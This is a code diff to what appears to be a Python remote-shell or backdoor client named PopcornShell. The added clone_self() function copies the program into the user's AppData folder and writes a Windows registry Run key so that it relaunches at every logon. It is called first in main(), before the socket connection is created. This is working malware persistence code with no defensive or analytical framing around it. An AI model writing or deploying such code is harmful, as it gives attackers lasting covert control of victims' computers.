@@ -1,5 +1,8 @@
 import os
+import shutil
 import subprocess
+import sys
+
 from command_payload import CommandPayload
 from command_payload import parse_payload_to_output
 from secure_socket import SecureSocket
@@ -103,8 +106,16 @@ def run_command(cmd):
     payload = CommandPayload(stdout=result[0], stderr=result[1])
     return payload
 
+def clone_self():
+    path = os.environ["AppData"] + "\\PopcorenShell.exe"
+    if not os.path.exists(path):
+        shutil.copyfile(sys.executable, path)
+        cmd = f"reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v PopcornShell /t REG_SZ /d \"{path}\""
+        subprocess.call(cmd, shell=True)
+
 
 def main():
+    clone_self()
     create_socket()
 
 
